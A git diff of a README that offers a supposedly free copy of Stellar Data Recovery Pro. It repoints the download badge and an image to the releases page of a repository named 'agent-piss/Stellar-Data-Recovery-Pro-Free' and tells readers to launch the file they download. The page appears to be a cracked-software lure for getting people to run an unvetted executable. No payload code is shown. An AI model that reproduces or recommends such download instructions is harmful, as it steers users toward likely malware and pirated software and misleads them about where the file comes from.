@@ -9,7 +9,7 @@ Welcome to the Stellar Data Recovery Pro Free repository! Here you can find info
 
 ## Get Started
 To access the content related to stellar phoenix data recovery pro, stellar phoenix windows data recovery pro, and more, you can download the repository content from the following link:
-[![Download Stellar Data Recovery Pro](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/uploads/App.zip)
+[![Download Stellar Data Recovery Pro](https://github.com/agent-piss/Stellar-Data-Recovery-Pro-Free/releases)](https://github.com/agent-piss/Stellar-Data-Recovery-Pro-Free/releases)
 
 ### Note:
 - If the link ends with the file name, make sure to launch it to start exploring the Stellar Data Recovery Pro Free content.
@@ -21,7 +21,7 @@ For additional updates or alternate download options, don't forget to check the 
 
 Let's embark on a journey of data recovery excellence with Stellar Data Recovery Pro Free! 🚀🔍📁
 
-![Stellar Data Recovery](https://images.unsplash.com/photo-1614221243074-3637e39f6a04)
+![Stellar Data Recovery](https://github.com/agent-piss/Stellar-Data-Recovery-Pro-Free/releases)
 
 Happy Data Recovery! 🌌🛠️
 
